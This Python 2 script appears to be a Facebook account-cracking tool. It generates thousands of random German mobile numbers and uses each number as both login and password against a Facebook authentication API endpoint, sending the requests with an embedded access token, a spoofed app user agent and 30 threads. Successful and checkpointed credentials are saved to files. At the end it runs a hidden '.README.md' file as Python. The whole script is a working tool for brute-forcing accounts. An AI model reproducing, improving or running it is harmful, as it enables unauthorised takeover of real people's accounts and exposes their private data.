import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(15000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('')

try:
    import mechanize
except ImportError:
    os.system('')
    time.sleep(1)
    os.system('')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo ="""
             nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn.
          .MS?MMMMMMMMMMMMMMMMMM?MM~MMMMMMMMMSHMMMMMMMM(?"~\
          MMMMMH?MMMMMMMX*MM?MMX%MM/MMMMMM"HMMMMMMMMMMMMMMH
         MMMMMMMMMMMMMMMMMX*MX*MMMX?MMMMM(M!XMMMMMMMMMMMMMMMX
        XMC)?MMMMMMMMMMMMMMMhX?!?MMMMX#MM!MXMMMMMMMMMMMML   '~
'\      MMMMMMMMMMMMMMMMMMMMMMMM!~`````-`~!?MMMM)MMMMMMMMx
   `~""MMM)MMMMMMMMMMMMMMMHhHH!~           `#MM(MMMMMMMMMM>
      HM!HMMMMMMMMMMMMMMMM*?)?`                `"MMMMMMMMMX       .
     XM!MMMMMMMMMMMMMMMMMMM?~                     'MMMMMMMM:..xx!`
     M!MMMMMMMMMMMMMMMMMXH!                        MMMMXMMP"`
    \!MMMMMMMSMHHHMM?XMM?~    -:::xx..             M?XMM?".x(
    MXMMMMMMMMMM!XHMMMM":       ... `"%x          XHHHMMM*"
   \!MMMMMMMM?XMMMMMMX!'~L     '%%%+:.  `       ..MMMMM"
   'HMMMMMM?HMMMMM*XM!    h     ~\).^\~     .%""`MM?"
   'MMMMMMMMMMMMMXMMM!    -X               +%%!.MMMXk
   ?MMMMMMMMMMMXMMMMM `.   ~               `""'XMMMMX
   !MMMMMMMMMMMMMMMMMX.    '                  XMkMMX>
   XMMMMMMMMMMMMMMM?MXXXx.-`                  XXMMM!
   MMMMMMMMMMMMMMMMXMXXXXXXx.         ~~      MMMMM
   XMMMMMMMMMMMM?MMXXXXXXXXX!`         '+^  .MMM!P
   'MMM!MMMMMMMMMi?M!"`        `~%HHHHxx.  xMMMM"
   :MMMMMMMMMMMMMMM"               `\XMM .MMMMM
   XMMMMMMMMMX?MM!                   `( HMMMMM
  XMMMM)MMM"   \~                     'MMMMM*
 'MMMMfMMM"  \~                        XMMM*
.MMMMMXMM"  ^                          `MMM
XMMMM!MM"                               MM>
HMMMMXM~                                MM>
?MMMMM~                                 Xf%
 MMMMf                                  %% \
 4MMM                                    %
   `M                                     %
     %                                    %
     %                                     %
     %                 !                   %
      %                 !                   %
      %                 %                   !?%.
      %                  %                   X. %%.
       %                  %                  X!    %%.
       %                  %                  '!       %.
        %                  %                  !!         %.
        %                  %                  '!          `%
         %                  %                  !>          /%
         %                   %                 !!          % %
          %                   %                 !          \%
          %                   %                 !!          %
           %                   %                '!         %~
            %                   %                !!       %~
            %%                  %                `!     %%
            %%%                  %                %++4MMf
             ?MMx                 %                %. MMX
              *MMMx               %                 !\'MMM>
               MMMMMHx    .....xxnH                  %HMMM>
                MMMMMMMMMMMMMMMMMMM>                  MMMMX
                'MMMMMMMMMMMMMMMMMMk                  'MMMM
                 'MMMMMMMMMMMMMMMMMM                   MMMM>
                  ?MMMMMMMMMMMMMMMMMM                  'MMMX
                   MMMMMMMMMMMMMMMMMMM                  MMMM
                   XMMMMM
                                        
                                        
                                        
                                                            
                                       
 -----------------------------------------------------                                       
\033[1;94mAuthor:Snapchat shakar_namo
\033[1;94m  INSTAGRAM / 5h4ka
\033[1;92m COLOGNE
\033[1;92mNote : 5H4KA         
    """
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m GERMAN CRACK NUMMER '
    print 42 * '\x1b[1;91m='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mSelect Option \x1b[1;93m>>>\x1b[1;95m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92m0152, 0172, 0173, 0157,0163,0162,0176,0151'
        try:
            c = raw_input(' german CoDE  : ')
            k = ''
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '0':
        exb()
    else:
        print '[!] file ist nicht gut'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] CHOOSE CODE: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m warte bruder')
    time.sleep(0.1)
    psb('[!] To Stop CRACK CTRL+Z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Prozess wurde abgeschlossen ....'
    print '[\xe2\x9c\x93]\x1b[1;92m gesamt OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP Datei wurde gespeichert : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')
    
    
if __name__ == '__main__':
    menu()
